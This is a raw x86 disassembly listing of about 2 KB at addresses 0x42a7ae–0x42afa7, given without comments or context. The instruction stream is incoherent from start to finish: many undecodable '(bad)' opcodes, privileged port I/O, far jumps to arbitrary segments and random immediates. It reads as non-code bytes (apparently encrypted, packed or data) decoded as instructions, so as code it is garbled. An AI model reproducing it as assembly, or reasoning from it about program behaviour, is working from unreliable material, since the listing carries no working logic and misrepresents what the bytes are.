  42a7ae:	(bad)  
  42a7af:	call   0x4198792
  42a7b4:	sar    DWORD PTR [edx-0x21d31fd],cl
  42a7ba:	or     ch,dl
  42a7bc:	in     eax,0xd4
  42a7be:	mov    ebp,0xd8e9e10e
  42a7c3:	adc    esp,ebp
  42a7c5:	fsubr  QWORD PTR [ecx-0x1d293e15]
  42a7cb:	mov    edx,0xfaf3f7d9
  42a7d0:	mov    esi,0xb7f3e8d7
  42a7d5:	mov    ebp,0x7f005d2
  42a7da:	fadd   st,st(0)
  42a7dc:	jecxz  0x42a7c8
  42a7de:	aam    0xd
  42a7e0:	or     eax,0xedf2d901
  42a7e5:	mov    cl,0xa9
  42a7e7:	jmp    0xf9f7:0xc9d6d4ce
  42a7ee:	repz jmp 0xefe1:0xc9d4fdba
  42a7f6:	fcom   st(0)
  42a7f8:	(bad)  
  42a7fa:	out    0xa,al
  42a7fc:	add    DWORD PTR [edi],eax
  42a7fe:	clc    
  42a7ff:	out    dx,al
  42a800:	fiadd  DWORD PTR [edx]
  42a802:	jmp    0x42a807
  42a804:	int3   
  42a805:	in     eax,dx
  42a806:	not    ecx
  42a808:	lock mov esp,0xb4e9b6d7
  42a80e:	lock mov bh,0xd8
  42a811:	clc    
  42a812:	sti    
  42a813:	call   0xfb308612
  42a818:	shl    eax,cl
  42a81a:	clc    
  42a81b:	loop   0x42a7dd
  42a81d:	std    
  42a81e:	enter  0xeac4,0xed
  42a822:	in     eax,0xfa
  42a824:	(bad)  
  42a825:	jmp    0xdbb1:0xcaaee6d2
  42a82c:	in     al,0xda
  42a82e:	fcmovnu st,st(1)
  42a830:	lds    edi,FWORD PTR [ebp-0x3d42fe32]
  42a836:	frstpm(287 only) 
  42a838:	repnz add ch,al
  42a83b:	(bad)  
  42a83d:	retf   0xfcf4
  42a840:	fcmove st,st(6)
  42a842:	retf   0xdc03
  42a845:	(bad)  
  42a846:	lock (bad) 
  42a849:	(bad)  
  42a84a:	mov    al,0xb3
  42a84c:	fsubr  st,st(7)
  42a84e:	mov    ch,0xda
  42a850:	sar    DWORD PTR [ecx-0x47403027],cl
  42a856:	(bad)  
  42a857:	fadd   DWORD PTR [edx]
  42a859:	sar    edi,cl
  42a85b:	cli    
  42a85c:	jecxz  0x42a828
  42a85e:	sti    
  42a85f:	out    dx,eax
  42a860:	(bad)  
  42a861:	fsubr  st,st(3)
  42a863:	cld    
  42a864:	mov    esp,0xd2e3d6c5
  42a869:	jmp    0xf527841f
  42a86e:	(bad)
  42a871:	cld    
  42a872:	call   0x813ac47
  42a877:	jmp    eax
  42a879:	(bad)  
  42a87a:	aad    0xf7
  42a87c:	(bad)  
  42a87e:	test   DWORD PTR [ebx],0xc8d3c6f9
  42a884:	iret   
  42a885:	mov    al,0xe9
  42a887:	into   
  42a888:	aam    0xec
  42a88a:	repz mov edx,0xebf9cbe8
  42a890:	mov    ah,0xe8
  42a892:	std    
  42a893:	imul   al
  42a895:	mov    edx,0xd504ced2
  42a89a:	add    al,0xe4
  42a89c:	rol    BYTE PTR ds:0xe1c6ddeb,1
  42a8a2:	push   cs
  42a8a3:	ror    cl,0xd7
  42a8a6:	mov    bl,0xc9
  42a8a8:	imul   BYTE PTR [edx-0x31320f06]
  42a8ae:	in     eax,dx
  42a8af:	jmp    0xdc3561aa
  42a8b4:	idiv   BYTE PTR [esi-0x390d3139]
  42a8ba:	push   es
  42a8bb:	stc    
  42a8bc:	call   0x1ab0b0
  42a8c1:	sti    
  42a8c2:	loopne 0x42a8b2
  42a8c4:	lock lock out dx,al
  42a8c7:	loop   0x42a8a9
  42a8c9:	mov    bh,0xd0
  42a8cb:	iret   
  42a8cc:	sti    
  42a8cd:	in     eax,0xd8
  42a8cf:	leave  
  42a8d0:	mov    esi,0xf1cffefc
  42a8d5:	mul    edi
  42a8d7:	stc    
  42a8d8:	(bad)  
  42a8d9:	or     ebx,eax
  42a8db:	jmp    0xe84071d9
  42a8e0:	(bad)
  42a8e3:	adc    esp,esp
  42a8e5:	(bad)  
  42a8e6:	jmp    0x42a8b0
  42a8e8:	xlat   BYTE PTR ds:[ebx]
  42a8e9:	rol    esp,cl
  42a8eb:	mov    bh,0xf9
  42a8ed:	repnz out 0xce,eax
  42a8f0:	retf   0xc8e8
  42a8f3:	in     al,dx
  42a8f4:	loop   0x42a8af
  42a8f6:	add    bh,cl
  42a8f8:	add    ah,ah
  42a8fa:	loop   0x42a8e5
  42a8fc:	in     eax,0xca
  42a8fe:	ror    cl,0xf9
  42a901:	into   
  42a902:	adc    eax,DWORD PTR [ebx]
  42a904:	jmp    0x42a8b0
  42a906:	int    0xac
  42a908:	(bad)  
  42a909:	sti    
  42a90a:	lods   al,BYTE PTR ds:[esi]
  42a90b:	int    0xf0
  42a90d:	repz mov ecx,0xb8dfbbf8
  42a913:	icebp  
  42a914:	jecxz  0x42a8fd
  42a916:	sti    
  42a917:	sar    ebp,cl
  42a919:	in     al,dx
  42a91a:	idiv   eax
  42a91c:	fndisi(8087 only) 
  42a91e:	xlat   BYTE PTR ds:[ebx]
  42a91f:	(bad)  
  42a920:	fucomp st(2)
  42a922:	add    ecx,ecx
  42a924:	mov    bl,0xe4
  42a926:	fmulp  st(3),st
  42a928:	loopne 0x42a918
  42a92a:	shl    edi,1
  42a92c:	mov    bl,0xe5
  42a92e:	mov    ah,0xb6
  42a930:	rcr    ah,1
  42a932:	cli    
  42a933:	mul    ebx
  42a935:	rcr    esi,cl
  42a937:	(bad)  
  42a938:	repz aam 0xf2
  42a93b:	lock (bad) 
  42a93e:	add    BYTE PTR [edi],al
  42a940:	loopne 0x42a90b
  42a942:	loope  0x42a92b
  42a944:	loopne 0x42a903
  42a946:	ret    0xe5c1
  42a949:	retf   
  42a94a:	cli    
  42a94b:	fcmovbe st,st(6)
  42a94d:	out    dx,al
  42a94e:	lods   eax,DWORD PTR ds:[esi]
  42a94f:	neg    bh
  42a951:	int    0xb4
  42a953:	test   edi,0x6c0d403
  42a959:	out    0xc5,al
  42a95b:	mov    eax,0xd6db06e0
  42a960:	clc    
  42a961:	retf   
  42a962:	into   
  42a963:	(bad)  
  42a964:	loopne 0x42a925
  42a966:	mov    edi,0xd4f6e1ed
  42a96b:	out    dx,eax
  42a96c:	in     eax,dx
  42a96d:	rcl    cl,0xee
  42a970:	in     eax,0xe8
  42a972:	cmc    
  42a973:	mov    esp,0xbcc0d6d8
  42a978:	mov    ebp,0xe8e30bf4
  42a97d:	stc    
  42a97e:	jmp    0x42a945
  42a980:	out    0xcc,eax
  42a982:	leave  
  42a983:	fild   QWORD PTR [edx-0x51383448]
  42a989:	mov    dl,0xe3
  42a98b:	rcl    bh,1
  42a98d:	mov    al,0xe7
  42a98f:	dec    ebp
  42a991:	enter  0xdaf1,0xbb
  42a995:	mov    dh,0xed
  42a997:	lock repz cli 
  42a99a:	aam    0xc0
  42a99c:	cmc    
  42a99d:	add    dl,bl
  42a99f:	aad    0xee
  42a9a1:	loop   0x42a9af
  42a9a3:	jmp    FWORD PTR [edx-0xd13522f]
  42a9a9:	enter  0xeec4,0xee
  42a9ad:	iret   
  42a9ae:	fsubr  st,st(3)
  42a9b0:	fistp  QWORD PTR [edx+0x1f7d2e3]
  42a9b6:	fdivr  st,st(6)
  42a9b8:	lock in eax,0xe6
  42a9bb:	shr    ecx,0xbe
  42a9be:	ffree  st(0)
  42a9c0:	into   
  42a9c1:	jmp    0xcec9:0xc1a8ec13
  42a9c8:	scas   eax,DWORD PTR es:[edi]
  42a9c9:	rcl    edi,0xf2
  42a9cc:	mov    ecx,0xb6bac9f4
  42a9d1:	jmp    0xdbbf:0xf7f1f2b9
  42a9d8:	inc    esi
  42a9da:	cmc    
  42a9db:	add    eax,0xc8f9fdd4
  42a9e0:	out    dx,eax
  42a9e1:	out    dx,al
  42a9e2:	jmp    0xcb2167ab
  42a9e7:	aad    0xc0
  42a9e9:	loope  0x42a9dc
  42a9eb:	loope  0x42a9c6
  42a9ed:	scas   al,BYTE PTR es:[edi]
  42a9ee:	retf   0xe5ea
  42a9f1:	cmc    
  42a9f2:	aad    0xd3
  42a9f4:	(bad)  
  42a9f6:	clc    
  42a9f7:	loop   0x42a9f2
  42a9f9:	(bad)  
  42a9fb:	shl    cl,0xde
  42a9fe:	(bad)  
  42aa00:	frstpm(287 only) 
  42aa02:	stc    
  42aa03:	std    
  42aa04:	lock (bad) 
  42aa06:	icebp  
  42aa07:	shr    bl,cl
  42aa09:	jmp    0xbbf6:0xf4dbe6d3
  42aa10:	enter  0x2b5,0xf9
  42aa14:	sti    
  42aa15:	cli    
  42aa16:	out    0xbc,eax
  42aa18:	faddp  st(4),st
  42aa1a:	(bad)  
  42aa1b:	fst    st(4)
  42aa1d:	jecxz  0x42a9f8
  42aa1f:	stc    
  42aa20:	or     edi,ebx
  42aa22:	fdiv   st(1),st
  42aa24:	retf   0xddf7
  42aa27:	mov    dl,0xbd
  42aa29:	jecxz  0x42aa10
  42aa2b:	aad    0xef
  42aa2d:	in     al,dx
  42aa2e:	out    0xcf,eax
  42aa30:	in     eax,dx
  42aa31:	not    esp
  42aa33:	stc    
  42aa34:	stc    
  42aa35:	xlat   BYTE PTR ds:[ebx]
  42aa36:	mov    ebp,0xb9bee3d5
  42aa3b:	jecxz  0x42a9fe
  42aa3d:	std    
  42aa3e:	inc    DWORD PTR [eax]
  42aa40:	(bad)  
  42aa41:	jecxz  0x42aa4e
  42aa43:	or     ah,bl
  42aa45:	out    dx,eax
  42aa46:	test   eax,0xcff1b6bc
  42aa4b:	jmp    0x42aa45
  42aa4d:	(bad)  
  42aa4f:	jmp    0xe3b7:0xd8e8f5d1
  42aa56:	loopne 0x42aa2d
  42aa58:	std    
  42aa59:	clc    
  42aa5a:	in     al,0xe7
  42aa5c:	mov    edi,0xfcfcbdfb
  42aa61:	fcmove st,st(6)
  42aa63:	iret   
  42aa64:	retf   0xe1ae
  42aa67:	(bad)  
  42aa68:	mov    ch,0xea
  42aa6a:	neg    cl
  42aa6c:	xlat   BYTE PTR ds:[ebx]
  42aa6d:	loopne 0x42aa23
  42aa6f:	int    0xd0
  42aa71:	leave  
  42aa72:	add    edi,DWORD PTR [edx-0x1e081224]
  42aa78:	loopne 0x42aa6d
  42aa7a:	pop    es
  42aa7b:	loope  0x42aa56
  42aa7d:	(bad)  
  42aa7e:	std    
  42aa7f:	cli    
  42aa80:	cmc    
  42aa81:	dec    esi
  42aa83:	in     al,0xab
  42aa85:	loope  0x42aa63
  42aa87:	(bad)
  42aa8a:	aam    0xf2
  42aa8c:	iret   
  42aa8d:	cmc    
  42aa8e:	(bad)  
  42aa8f:	call   esi
  42aa91:	out    dx,eax
  42aa92:	add    edi,esi
  42aa94:	std    
  42aa95:	out    dx,eax
  42aa96:	jecxz  0x42aa56
  42aa98:	shl    cl,1
  42aa9a:	fnclex 
  42aa9c:	jmp    0xa23948c
  42aaa1:	fadd   st,st(1)
  42aaa3:	in     al,dx
  42aaa4:	rcr    ebp,0xd3
  42aaa7:	scas   eax,DWORD PTR es:[edi]
  42aaa8:	out    0xf4,al
  42aaaa:	hlt    
  42aaab:	mov    al,0xfa
  42aaad:	out    0xcd,eax
  42aaaf:	(bad)  
  42aab0:	jmp    0x42aa8c
  42aab2:	jmp    0xc4307779
  42aab7:	in     eax,dx
  42aab8:	loopne 0x42aaaf
  42aaba:	aam    0x4
  42aabc:	in     al,0xef
  42aabe:	out    0xc6,eax
  42aac0:	or     dl,bh
  42aac2:	in     al,0xff
  42aac4:	test   eax,0xd4d0c1b8
  42aac9:	jmp    0xddb7:0xd0ece7ad
  42aad0:	jmp    0xe0ba:0xd7bfcbed
  42aad7:	int3   
  42aad8:	fld    DWORD PTR [esi]
  42aada:	mov    dl,0xc1
  42aadd:	rcr    edx,0xea
  42aae0:	add    al,0xf
  42aae2:	in     eax,0x8
  42aae4:	stos   DWORD PTR es:[edi],eax
  42aae5:	into   
  42aae6:	iret   
  42aae7:	lds    edi,FWORD PTR [eax+esi*8-0x9192e18]
  42aaee:	lods   eax,DWORD PTR ds:[esi]
  42aaef:	les    edi,FWORD PTR [ebp-0x4621023c]
  42aaf5:	repnz mov esp,0xc7d3dec0
  42aafb:	fsubp  st(1),st
  42aafd:	add    dl,cl
  42aaff:	out    dx,al
  42ab00:	(bad)  
  42ab02:	sti    
  42ab03:	(bad)  
  42ab05:	not    edx
  42ab07:	repnz not ch
  42ab0a:	lock shl DWORD PTR [edi-0x14f4b0e],1
  42ab11:	add    ebx,ebp
  42ab13:	fld    QWORD PTR [eax]
  42ab15:	mov    esp,0xd1feb4d1
  42ab1a:	ret    0x1e2
  42ab1d:	(bad)  
  42ab1e:	test   BYTE PTR [edx],0x3
  42ab21:	retf   0xdd06
  42ab24:	(bad)  
  42ab26:	ret    
  42ab27:	(bad)  
  42ab28:	ret    
  42ab29:	jmp    0xaf0c7af5
  42ab2e:	mov    ecx,0xbff2bafe
  42ab33:	hlt    
  42ab34:	sti    
  42ab35:	iret   
  42ab36:	shl    bh,1
  42ab38:	sar    DWORD PTR [edx+ebx*8-0x20012005],0xff
  42ab40:	fisttp WORD PTR [ecx*1-0x3d0d4f00]
  42ab47:	imul   BYTE PTR [edi-0x706181c]
  42ab4d:	sti    
  42ab4e:	mov    cl,0xd9
  42ab50:	shl    DWORD PTR [ebp-0x49214536],1
  42ab56:	std    
  42ab57:	out    0xed,eax
  42ab59:	repnz loop 0x42ab39
  42ab5c:	out    0xf9,al
  42ab5e:	cmc    
  42ab5f:	loope  0x42ab28
  42ab61:	(bad)  
  42ab62:	loop   0x42ab48
  42ab64:	in     al,0xd1
  42ab66:	out    0xca,al
  42ab68:	jmp    0x42ab2b
  42ab6a:	retf   
  42ab6b:	in     al,0xc1
  42ab6d:	shr    dh,1
  42ab6f:	std    
  42ab70:	jmp    0xfcd8:0xfabcb8cd
  42ab77:	fdiv   st(5),st
  42ab79:	repz mov ecx,0xcbfafdfe
  42ab7f:	aam    0x4
  42ab81:	leave  
  42ab82:	add    dl,BYTE PTR [ebx]
  42ab84:	fcomip st,st(7)
  42ab86:	leave  
  42ab87:	into   
  42ab88:	scas   al,BYTE PTR es:[edi]
  42ab89:	(bad)
  42ab8c:	cli    
  42ab8d:	ror    edi,1
  42ab8f:	in     al,0xf3
  42ab91:	mov    ah,0xda
  42ab93:	dec    ch
  42ab95:	pop    es
  42ab96:	hlt    
  42ab97:	add    eax,0xfee2c4df
  42ab9c:	hlt    
  42ab9d:	idiv   esi
  42ab9f:	stc    
  42aba0:	out    0xfc,al
  42aba2:	push   es
  42aba3:	int    0xa7
  42aba5:	(bad)  
  42aba7:	shl    eax,cl
  42aba9:	lods   eax,DWORD PTR ds:[esi]
  42abaa:	loop   0x42ab81
  42abac:	clc    
  42abad:	out    0xb5,al
  42abaf:	stc    
  42abb0:	fsqrt  
  42abb2:	leave  
  42abb3:	cld    
  42abb4:	fucom  st(1)
  42abb6:	iret   
  42abb7:	(bad)  
  42abb8:	mov    esi,0xc3e307e6
  42abbd:	jecxz  0x42ab9b
  42abbf:	hlt    
  42abc0:	or     ebp,esp
  42abc2:	clc    
  42abc3:	call   0xce0f9089
  42abc8:	lock ret 0xb0e5
  42abcc:	retf   
  42abcd:	repnz cmc 
  42abcf:	std    
  42abd0:	retf   0xbadc
  42abd3:	add    ch,ch
  42abd5:	add    ch,ah
  42abd7:	repnz loopne 0x42abbb
  42abda:	xlat   BYTE PTR ds:[ebx]
  42abdb:	fcomp  st(1)
  42abdd:	rol    ah,0x7
  42abe0:	leave  
  42abe1:	fucom  st(6)
  42abe3:	dec    al
  42abe5:	lock mov esi,0xb3e9d1ea
  42abeb:	(bad)  
  42abec:	cmc    
  42abed:	out    dx,al
  42abee:	aad    0xac
  42abf0:	mov    ebx,0xd8feefda
  42abf5:	loopne 0x42abe3
  42abf7:	sti    
  42abf8:	jmp    eax
  42abfa:	loop   0x42abe3
  42abfc:	(bad)  
  42abfe:	(bad)  
  42ac00:	pmulhw mm1,QWORD PTR [edi]
  42ac03:	iret   
  42ac04:	into   
  42ac05:	mov    al,0xf0
  42ac07:	cmc    
  42ac08:	repz shr ebp,1
  42ac0b:	iret   
  42ac0c:	in     al,0xeb
  42ac0e:	jmp    0xebf761fd
  42ac13:	iret   
  42ac14:	jecxz  0x42ac0d
  42ac16:	ret    0xd7d4
  42ac19:	aam    0xda
  42ac1b:	aam    0xe5
  42ac1d:	lock mov BYTE PTR [edi],0xc
  42ac21:	(bad)  
  42ac23:	pop    es
  42ac24:	in     eax,dx
  42ac25:	scas   al,BYTE PTR es:[edi]
  42ac26:	enter  0xd6ee,0xd5
  42ac2a:	aad    0xc4
  42ac2c:	in     al,0xdf
  42ac2e:	fyl2x  
  42ac30:	out    dx,al
  42ac31:	mov    dh,0xc8
  42ac33:	lock fcomi st,st(2)
  42ac36:	sar    BYTE PTR [edx+edi*8-0x2b39fa0d],0xe7
  42ac3e:	hlt    
  42ac3f:	fsub   st(0),st
  42ac41:	fcmovnbe st,st(3)
  42ac43:	or     eax,0xe4e0c2c1
  42ac48:	out    dx,eax
  42ac49:	int    0xc0
  42ac4b:	rcl    ebp,1
  42ac4d:	xlat   BYTE PTR ds:[ebx]
  42ac4e:	stc    
  42ac4f:	call   0xb5407821
  42ac54:	int    0xe1
  42ac56:	repz repz rol BYTE PTR [esi],cl
  42ac5a:	(bad)  
  42ac5b:	in     eax,0xc1
  42ac5d:	or     al,BYTE PTR [ecx]
  42ac5f:	or     ebp,edx
  42ac61:	(bad)  
  42ac63:	adc    ecx,edi
  42ac65:	repz call 0xcb14a14b
  42ac6b:	mov    al,0xe8
  42ac6d:	repnz (bad) 
  42ac6f:	in     al,0xfd
  42ac71:	cld    
  42ac72:	sar    DWORD PTR [ebp-0xc3d2003],cl
  42ac78:	f2xm1  
  42ac7a:	repz or eax,DWORD PTR [ecx]
  42ac7d:	fsubr  st,st(6)
  42ac7f:	add    dl,bl
  42ac81:	clc    
  42ac82:	in     al,0xe1
  42ac84:	(bad)  
  42ac85:	mov    al,0xe5
  42ac87:	loopne 0x42ac58
  42ac89:	rol    cl,cl
  42ac8b:	mov    bl,0xf6
  42ac8d:	cli    
  42ac8e:	lods   eax,DWORD PTR ds:[esi]
  42ac8f:	fnstcw WORD PTR [ebp-0x2106430f]
  42ac95:	icebp  
  42ac96:	fistp  QWORD PTR [ebp+0x4e4d7f1]
  42ac9c:	fucomp st(7)
  42ac9e:	fcmovu st,st(7)
  42aca0:	dec    ch
  42aca2:	lds    ecx,FWORD PTR [ecx]
  42aca4:	mov    edi,0xe6def0c3
  42aca9:	ret    0xe8e4
  42acac:	in     eax,0xd5
  42acae:	jmp    0x42ac76
  42acb0:	aad    0xed
  42acb2:	idiv   ch
  42acb4:	div    ebx
  42acb6:	into   
  42acb7:	in     eax,dx
  42acb8:	lock add eax,0xe8ffc0c0
  42acbe:	(bad)  
  42acbf:	cmc    
  42acc0:	iret   
  42acc1:	ret    0x907
  42acc4:	test   eax,0xc3bebdc0
  42acc9:	in     al,0xc4
  42accb:	int    0xd7
  42accd:	retf   
  42acce:	jmp    0x42acbf
  42acd0:	mov    edx,0xe2e9bfb9
  42acd5:	out    dx,eax
  42acd6:	cld    
  42acd7:	out    dx,al
  42acd8:	out    0xdc,eax
  42acda:	retf   
  42acdb:	rol    BYTE PTR [edi+eax*1],cl
  42acde:	sti    
  42acdf:	or     esp,edi
  42ace1:	add    bl,bl
  42ace3:	fmul   st,st(0)
  42ace5:	shr    edi,1
  42ace7:	leave  
  42ace8:	ret    0xd2cd
  42aceb:	loope  0x42acd1
  42aced:	rcr    eax,1
  42acef:	mov    esi,0xf4e2beda
  42acf4:	leave  
  42acf5:	mov    ebp,0xc5dcc7
  42acfa:	cmc    
  42acfb:	cld    
  42acfc:	fild   WORD PTR ds:0xecf406dd
  42ad02:	(bad)  
  42ad04:	(bad)  
  42ad05:	mov    dl,0xdf
  42ad07:	scas   eax,DWORD PTR es:[edi]
  42ad08:	(bad)
  42ad0b:	leave  
  42ad0c:	mov    cl,0xd3
  42ad0e:	(bad)  
  42ad10:	(bad)
  42ad13:	ret    0xdcb9
  42ad16:	icebp  
  42ad17:	add    esi,edx
  42ad19:	jmp    0x42acf1
  42ad1b:	les    eax,FWORD PTR [ecx+eax*1]
  42ad1e:	or     esp,ecx
  42ad20:	add    eax,0xecd902e4
  42ad25:	loope  0x42acd5
  42ad27:	shl    cl,1
  42ad29:	jmp    0xfa1b8010
  42ad2e:	out    dx,eax
  42ad2f:	lods   al,BYTE PTR ds:[esi]
  42ad30:	mov    ebp,0xd8d3c3c9
  42ad35:	in     eax,dx
  42ad36:	loop   0x42ad0b
  42ad38:	stc    
  42ad39:	mov    esi,0xe8fecbe3
  42ad3e:	leave  
  42ad3f:	retf   0x20c
  42ad42:	iret   
  42ad43:	leave  
  42ad44:	int    0xb1
  42ad46:	(bad)  
  42ad47:	iret   
  42ad48:	aam    0xcf
  42ad4a:	retf   0xf3ca
  42ad4d:	fxch   st(3)
  42ad4f:	idiv   ah
  42ad51:	mov    edi,0x2d0d8cf
  42ad56:	neg    edi
  42ad58:	ret    0xf2f4
  42ad5b:	(bad)  
  42ad5c:	(bad)  
  42ad5d:	fdivr  st(5),st
  42ad5f:	fisttp QWORD PTR [edx]
  42ad61:	loopne 0x42ad48
  42ad63:	add    eax,0xd5ceccb3
  42ad68:	int    0xaa
  42ad6a:	repnz mov bh,0xcf
  42ad6d:	mov    edx,0xcbefc8b5
  42ad72:	push   ebp
  42ad74:	rol    BYTE PTR [edi],cl
  42ad76:	(bad)  
  42ad78:	pop    es
  42ad79:	clc    
  42ad7a:	xlat   BYTE PTR ds:[ebx]
  42ad7b:	rcr    cl,0xd7
  42ad7e:	cli    
  42ad7f:	add    ebx,edi
  42ad81:	add    DWORD PTR [eax],ecx
  42ad83:	fbld   TBYTE PTR [edi-0x19374c12]
  42ad89:	(bad)  
  42ad8a:	(bad)  
  42ad8b:	retf   
  42ad8c:	ror    ecx,0xe5
  42ad8f:	shr    esp,1
  42ad91:	iret   
  42ad92:	(bad)  
  42ad93:	(bad)  
  42ad95:	jecxz  0x42ad8c
  42ad97:	mov    edi,0xbcbcd7f7
  42ad9c:	icebp  
  42ad9d:	retf   
  42ad9e:	leave  
  42ad9f:	fsubr  st,st(5)
  42ada1:	add    dl,ah
  42ada3:	repz rol ecx,0xd3
  42ada7:	loope  0x42ad77
  42ada9:	(bad)
  42adac:	retf   
  42adad:	shr    bh,cl
  42adaf:	retf   0xeffa
  42adb2:	mov    ecx,0xf1f3dcdd
  42adb7:	in     al,dx
  42adb8:	ret    0xbf7
  42adbb:	add    eax,0xebfde2df
  42adc0:	fld    DWORD PTR [edi]
  42adc2:	jmp    0xc7c7:0xd7e0ae07
  42adc9:	loop   0x42ad8f
  42adcb:	mov    al,0xf4
  42adcd:	icebp  
  42adce:	out    0xb5,al
  42add0:	fmul   st,st(3)
  42add2:	loop   0x42adb6
  42add4:	fcmovnbe st,st(3)
  42add6:	ret    0xbd05
  42add9:	pop    es
  42adda:	loop   0x42adb0
  42addc:	out    0xfb,al
  42adde:	fcmovb st,st(0)
  42ade0:	int    0xcc
  42ade2:	into   
  42ade3:	loop   0x42ada7
  42ade5:	in     al,dx
  42ade6:	icebp  
  42ade7:	mov    cl,0xb6
  42ade9:	stos   BYTE PTR es:[edi],al
  42adea:	in     eax,dx
  42adeb:	jmp    0x3699c2
  42adf0:	xlat   BYTE PTR ds:[ebx]
  42adf1:	ror    ebp,1
  42adf3:	std    
  42adf4:	fnstcw WORD PTR [edi+0x6d3fcfa]
  42adfa:	stc    
  42adfb:	icebp  
  42adfc:	faddp  st(4),st
  42adfe:	aam    0xd5
  42ae00:	add    ebx,ebp
  42ae02:	(bad)  
  42ae04:	lods   al,BYTE PTR ds:[esi]
  42ae05:	loop   0x42adfa
  42ae07:	scas   al,BYTE PTR es:[edi]
  42ae08:	out    dx,al
  42ae09:	leave  
  42ae0a:	in     eax,0xb6
  42ae0c:	jmp    0xdcdf:0xf7f4f2cb
  42ae13:	sti    
  42ae14:	sar    edx,0xec
  42ae17:	(bad)  
  42ae19:	mov    edx,0x2ddd6fc
  42ae1e:	leave  
  42ae1f:	cmc    
  42ae20:	add    esi,ecx
  42ae22:	(bad)  
  42ae23:	adc    DWORD PTR [ebp-0x122a1c4e],ebp
  42ae29:	(bad)  
  42ae2a:	mov    ah,0xcb
  42ae2c:	loope  0x42ae27
  42ae2e:	f2xm1  
  42ae30:	mov    ebp,0xb8b4edcd
  42ae35:	hlt    
  42ae36:	mov    ch,0xfa
  42ae38:	mov    ebp,0xc0d2d3f5
  42ae3d:	out    dx,eax
  42ae3e:	out    0xef,al
  42ae40:	ret    
  42ae41:	(bad)
  42ae44:	enter  0xeeae,0xf7
  42ae48:	in     al,0xe2
  42ae4a:	test   eax,0xc5c9f0d7
  42ae4f:	mov    eax,0xecbad5d9
  42ae54:	shl    cl,cl
  42ae56:	jecxz  0x42ae4d
  42ae58:	fild   WORD PTR [edi]
  42ae5a:	sar    dh,cl
  42ae5c:	fld    st(4)
  42ae5e:	fstp   st(6)
  42ae60:	fisttp WORD PTR [eax+ecx*1]
  42ae63:	repnz repnz shl bh,1
  42ae67:	mov    bh,0xd2
  42ae69:	xlat   BYTE PTR ds:[ebx]
  42ae6a:	mov    ebx,0xf8f9b3d2
  42ae6f:	cli    
  42ae70:	iret   
  42ae71:	icebp  
  42ae72:	enter  0xdfd7,0xff
  42ae76:	loopne 0x42ae6d
  42ae78:	add    esi,esi
  42ae7a:	loop   0x42ae5f
  42ae7c:	stc    
  42ae7d:	(bad)  
  42ae7f:	push   cs
  42ae80:	iret   
  42ae81:	enter  0xf2eb,0xd8
  42ae85:	les    esi,FWORD PTR [edx-0xe4c1d1e]
  42ae8b:	icebp  
  42ae8c:	repnz iret 
  42ae8e:	mov    eax,0xf4bbecd6
  42ae93:	jecxz  0x42ae4d
  42ae95:	aam    0xb5
  42ae97:	add    eax,0xfcfcd1c7
  42ae9c:	cli    
  42ae9d:	aad    0xe4
  42ae9f:	add    eax,0xeec9d80e
  42aea4:	fucomip st,st(5)
  42aea6:	xlat   BYTE PTR ds:[ebx]
  42aea7:	loop   0x42ae73
  42aea9:	(bad)  
  42aeaa:	fcmovbe st,st(7)
  42aeac:	in     al,dx
  42aead:	in     eax,0xec
  42aeaf:	(bad)  
  42aeb1:	mov    esi,0xc8befbd0
  42aeb6:	(bad)  
  42aeb7:	repnz mov ebx,0xd1e6d5fe
  42aebd:	loop   0x42aec1
  42aebf:	(bad)  
  42aec0:	in     al,dx
  42aec1:	aam    0xdb
  42aec3:	push   cs
  42aec4:	shl    edi,cl
  42aec6:	mov    esp,0xdad6c3b7
  42aecb:	shl    BYTE PTR [ebp-0x1019],cl
  42aed1:	mov    ebx,0xfcb903de
  42aed6:	out    dx,eax
  42aed7:	into   
  42aed8:	ret    0xc7dd
  42aedb:	add    dl,al
  42aedd:	jmp    0xea08:0x4fbee04
  42aee4:	rcl    cl,cl
  42aee6:	(bad)  
  42aee7:	aad    0xc9
  42aee9:	div    DWORD PTR [edx-0x112a2c09]
  42aeef:	rcr    bh,cl
  42aef1:	ror    dh,1
  42aef3:	(bad)  
  42aef5:	out    dx,al
  42aef6:	(bad)  
  42aef7:	add    al,bl
  42aef9:	add    ebx,edi
  42aefb:	pop    es
  42aefc:	(bad)  
  42aefe:	jecxz  0x42aee4
  42af00:	pop    es
  42af01:	out    0xa,eax
  42af03:	rcl    al,0xdc
  42af06:	lods   eax,DWORD PTR ds:[esi]
  42af07:	(bad)
  42af0a:	loop   0x42aeed
  42af0c:	mov    edx,0xd7eecbce
  42af11:	into   
  42af12:	in     eax,dx
  42af13:	fadd   DWORD PTR [ebx]
  42af15:	cmc    
  42af16:	in     al,dx
  42af17:	int    0xd2
  42af19:	hlt    
  42af1a:	cld    
  42af1b:	or     eax,esp
  42af1d:	fcmovu st,st(6)
  42af1f:	aam    0xd5
  42af21:	into   
  42af22:	out    dx,eax
  42af23:	int3   
  42af24:	test   eax,0xdcd3c7e0
  42af29:	jecxz  0x42af20
  42af2b:	hlt    
  42af2c:	in     al,0xb1
  42af2e:	in     al,0xdd
  42af30:	jmp    0xd2456d31
  42af35:	mov    eax,0xd6dff7e2
  42af3a:	cli    
  42af3b:	add    al,0xd4
  42af3d:	(bad)  
  42af3f:	sti    
  42af40:	add    edx,ebp
  42af42:	(bad)
  42af45:	(bad)  
  42af46:	icebp  
  42af47:	repnz not esi
  42af4a:	mov    ah,0xda
  42af4c:	jmp    0xd7116427
  42af51:	mov    ah,0x3
  42af53:	call   0xf2ffb259
  42af58:	sar    DWORD PTR [esi-0x232f2f24],0x4
  42af5f:	push   es
  42af60:	push   cs
  42af61:	leave  
  42af62:	out    dx,eax
  42af63:	fucom  st(2)
  42af65:	test   al,0xdd
  42af67:	mov    al,0xd3
  42af69:	repz into 
  42af6b:	enter  0xe8f1,0xee
  42af6f:	fstp   TBYTE PTR [edx-0x3291123]
  42af75:	into   
  42af76:	aad    0xf9
  42af78:	shl    bl,0xd5
  42af7b:	fadd   QWORD PTR [ebx]
  42af7d:	xlat   BYTE PTR ds:[ebx]
  42af7e:	cld    
  42af7f:	aam    0xfa
  42af81:	inc    BYTE PTR [ecx]
  42af83:	or     ah,al
  42af85:	les    edi,FWORD PTR [ebx+edx*8-0x3e44183f]
  42af8c:	div    DWORD PTR [esi-0x2a460808]
  42af92:	call   0xbd49b079
  42af97:	out    0x1,al
  42af99:	rcr    ebx,1
  42af9b:	retf   0xf5fc
  42af9e:	fcomp  st(7)
  42afa0:	std    
  42afa1:	out    dx,al
  42afa2:	retf   0xd8f3
  42afa5:	fsub   st,st(3)
  42afa7:	(bad)  
